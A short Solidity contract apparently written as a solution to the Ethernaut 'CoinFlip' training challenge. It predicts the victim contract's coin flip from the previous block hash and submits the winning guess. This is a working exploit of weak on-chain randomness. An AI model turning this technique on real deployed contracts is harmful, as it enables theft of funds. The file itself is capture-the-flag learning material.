 // SPDX-License-Identifier: MIT 
pragma solidity ^0.8.24;
// This smart contract implements an Attack targeting CoinFlip.sol from Ethernaut
//import the original smart-contact
import "./CoinFlip.sol";


contract CoinFlipAttack {

    CoinFlip public victim_smart_contract;
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _victim_Addr) public {
        victim_smart_contract= CoinFlip(_victim_Addr);

    }

//reproducing the function flip for the previous block as tge latest block has been validated
    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip= uint256(blockValue/FACTOR);
        bool side = coinFlip == 1 ? true: false;
        victim_smart_contract.flip(side);

}
}
